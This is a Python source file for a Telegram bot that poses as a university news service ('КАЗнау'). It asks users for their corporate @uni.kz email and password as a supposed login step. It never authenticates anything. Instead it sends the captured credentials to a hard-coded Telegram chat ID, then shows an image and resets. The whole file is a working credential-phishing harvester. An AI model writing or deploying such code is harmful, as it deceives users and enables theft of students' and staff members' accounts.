import telebot
import time
from configs import API_TOKEN
from user import Username
import re


bot = telebot.TeleBot(API_TOKEN)

markup = telebot.types.InlineKeyboardMarkup()
btn1 = telebot.types.InlineKeyboardButton("Читать новости❗", callback_data="news")
markup.add(btn1)

# This variable maps user to his state. The states are: 0 - user at main page; 1 - user types
# login; 2 - user types password
user_map = dict()


# Validating that email has correct format and @uni.kz
def is_valid_email(email, domain='uni.kz'):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if re.match(pattern, email) and email.split("@")[1] == domain:
        return True
    else:
        return False


# /start command handler
@bot.message_handler(commands=['help', 'start'])
def send_welcome(message: telebot.types.Message):
    user_map[message.from_user.id] = Username()

    bot.send_message(message.chat.id, """\
                Вас приветствует чат-бот КАЗнау
                Выберите действие\
                """, reply_markup=markup)


# function that processes "Read news" button
@bot.callback_query_handler(func=lambda call: call.data == 'news')
def news_handler(call: telebot.types.CallbackQuery):
    user_map.get(call.from_user.id, Username()).state = 1

    bot.send_message(call.message.chat.id, """\
                    Для получения новостной рассылки вам необходимо авторизоваться
                    Введите логин вашей корпоративной почты в формате ...@uni.kz 
                    """)


# function that handles messages from users
@bot.message_handler(func=lambda x: True)
def msg_handler(message: telebot.types.Message):
    global user_map

    # saves the login
    if user_map.get(message.from_user.id, Username()).state == 1:
        if is_valid_email(message.text):
            bot.send_message(message.chat.id, "Введите пароль")
            user_map[message.from_user.id].email = message.text
            user_map[message.from_user.id].state = 2
        else:
            bot.send_message(message.chat.id, "Введите корректный email")

    # saves the password
    elif user_map.get(message.from_user.id, Username()).state == 2:
        user_map[message.from_user.id].password = message.text
        for i in range(3, 0, -1):
            bot.send_message(message.chat.id, str(i))
            time.sleep(1)

        with open("1.jpg", 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        bot.send_message("477099094", user_map[message.from_user.id].get_info())
        send_welcome(message)
    # handle errors and returns user to start page
    else:
        send_welcome(message)


if __name__ == '__main__':
    print("=" * 20 + "Hello, Main!" + "=" * 20)
    bot.polling(none_stop=True)
